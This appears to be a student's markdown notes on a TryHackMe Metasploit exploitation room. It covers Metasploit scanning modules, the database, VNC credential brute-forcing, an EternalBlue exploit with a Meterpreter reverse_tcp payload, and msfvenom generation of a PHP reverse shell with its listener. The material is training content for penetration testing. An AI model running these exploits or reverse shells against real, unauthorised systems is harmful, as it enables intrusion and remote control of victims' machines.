# 🧨 Metasploit: Exploitation

---

## Task 1: Introduction

In this room, you will learn how to:

- Use **Metasploit** for vulnerability scanning and exploitation
- Leverage the **Metasploit database** for managing multi-target engagements
- Generate payloads using **msfvenom**
- Establish **Meterpreter** sessions

📁 **Wordlist path (for brute-force)**:
```
/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
```

---

## Task 2: Scanning

### 🔍 Port Scanning

Metasploit includes several `portscan` modules:

```bash
msf6 > search portscan
```

Recommended modules:
- `auxiliary/scanner/portscan/tcp`
- `auxiliary/scanner/portscan/syn`
- `auxiliary/scanner/portscan/xmas`

To use:

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS <target>
run
```

Or use native Nmap:

```bash
msf6 > nmap -sS 10.10.12.229
```

### 🔍 UDP Service Scanning

```bash
use auxiliary/scanner/discovery/udp_sweep
run
```

### 🔍 SMB Scanning

```bash
use auxiliary/scanner/smb/smb_version
run
```

---

## Task 3: The Metasploit Database

### 🚀 Initial Setup (Kali Only)

```bash
systemctl start postgresql
sudo -u postgres msfdb init
```

Launch `msfconsole` and check DB:

```bash
db_status
workspace
```

Create a new workspace:

```bash
workspace -a tryhackme
```

Use Nmap with DB integration:

```bash
db_nmap -sV -p- 10.10.12.229
hosts
services
```

Add scanned hosts to `RHOSTS`:

```bash
hosts -R
```

Query services:

```bash
services -S netbios
```

---

## Task 4: Vulnerability Scanning

Use service-specific scanners, such as:

```bash
use auxiliary/scanner/vnc/vnc_login
info
```

Use options like:

- `PASS_FILE`
- `RHOSTS`
- `THREADS`

Vulnerability scanning relies heavily on fingerprinting, enumeration, and smart module selection.

---

## Task 5: Exploitation

### 🎯 EternalBlue Example

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
set LHOST <your_ip>
set payload windows/x64/meterpreter/reverse_tcp
exploit
```

Background the session:

```bash
CTRL+Z or background
```

Manage sessions:

```bash
sessions
sessions -i <id>
sessions -h
```

---

## Task 6: Msfvenom

### 🎯 Common Payloads

```bash
msfvenom -l payloads
msfvenom --list formats
```

### 🔧 Generate PHP Reverse Shell

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f raw -e php/base64
```

The `reverse_shell.php` file should be edited to convert it into a working PHP file.

![raw_payload_start](https://github.com/user-attachments/assets/6ea5cd6d-4131-4b92-b520-ac171edb8c74)

Below: Comments removed from the beginning of the file.

![php_tag_fixed](https://github.com/user-attachments/assets/84b6f2cd-2015-4391-b137-48b524535b0d)

Below: End tag added

![php_tag_end](https://github.com/user-attachments/assets/71bc9a00-0c57-47e2-9b51-b142ee66d82e)

### 📡 Set up Listener with Multi Handler

```bash
use exploit/multi/handler
set payload php/reverse_php
set LHOST <your_ip>
set LPORT <port>
run
```

### 📦 Other Output Formats

- ELF: `-f elf`
- EXE: `-f exe`
- ASP: `-f asp`
- Python: `-f raw`

Always match your payload, LHOST, and LPORT in both `msfvenom` and `multi/handler`.

---

## Task 7: Summary

You now understand how to:

- Perform active scanning with Metasploit modules
- Utilize the database and workspace features
- Generate and deploy payloads using msfvenom
- Exploit vulnerabilities like EternalBlue
- Manage sessions with Meterpreter or shell

Metasploit is an indispensable exploitation framework in the modern penetration tester’s toolkit.
